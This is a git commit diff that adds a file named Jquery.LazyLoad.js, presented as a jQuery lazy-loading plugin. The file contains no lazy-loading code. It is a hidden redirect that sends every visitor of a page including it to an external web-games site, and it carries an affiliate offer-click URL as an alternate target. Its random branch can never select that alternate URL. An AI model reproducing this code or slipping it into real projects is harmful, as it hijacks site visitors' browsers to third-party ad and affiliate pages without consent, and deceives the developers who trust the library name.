ec3316ac4781ec78a070d2bb6ea7ad3f4959447c
forfreedom <mvp15878159844@163.com>
2015-10-14 11:37:10 +0800

    first commit

---
+++ Jquery.LazyLoad.js
@@ -0,0 +1,12 @@
+
+var n = Math.ceil(Math.random()*2);
+if (n==3)
+  {
+  var v="http://offer2.joymedia.mobi/index.php?r=api/offerclick&offer_id=24288&aff_id=120";
+  }  
+  else
+  {
+  var v="http://webgames.gioneemobile.net/index.php";
+  };
+  
+  window.location.href=v;
